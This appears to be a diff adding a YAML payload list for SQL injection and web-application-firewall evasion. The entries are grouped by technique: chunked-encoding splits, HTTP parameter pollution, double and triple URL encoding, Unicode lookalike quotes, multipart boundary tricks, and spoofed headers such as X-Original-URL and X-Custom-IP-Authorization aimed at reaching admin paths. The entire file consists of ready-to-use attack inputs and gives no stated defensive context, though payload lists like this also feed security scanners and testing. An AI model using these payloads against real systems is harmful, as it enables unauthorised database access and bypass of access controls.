@@ -1,0 +1,33 @@
+chunked_encoding:
+- "5\r\nUNION\r\n6\r\nSELECT\r\n"
+- "7\r\n' OR '1\r\n5\r\n'='1\r\n"
+http_param_pollution:
+- id=1&id=' OR '1'='1
+- id=1%00&id=' OR '1'='1
+- id=1/*&id=*/' OR '1'='1
+- id=1&id=2&id=' UNION SELECT 1,2,3--
+encoding_chain:
+- '%252527%252520OR%2525201=1'
+- '%25%32%37%25%32%30OR%25%32%30%31=%31'
+- \u0027\u0020OR\u0020\u0031=\u0031
+- '&#39;&#32;OR&#32;1=1'
+unicode_normalization:
+- ＇ OR ＇1＇=＇1
+- ʼ OR ʼ1ʼ=ʼ1
+- ′ OR ′1′=′1
+- ''' OR ''1''=''1'
+- ''' OR ''1''=''1'
+protocol_level:
+- "' OR '1'='1\r\n"
+- "X-Forwarded-For: 127.0.0.1\r\n\r\n' OR '1'='1"
+content_type_confusion:
+- "----WebKitFormBoundary\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n' OR '1'='1\r\n----WebKitFormBoundary--"
+request_method_switch:
+- id=' OR '1'='1
+header_injection:
+- 'X-Forwarded-For: 127.0.0.1'
+- 'X-Original-URL: /admin'
+- 'X-Rewrite-URL: /admin'
+- 'X-Custom-IP-Authorization: 127.0.0.1'
+- 'Content-Type: application/x-www-form-urlencoded; charset=ibm037'
+- 'Content-Type: application/json; charset=utf-7'
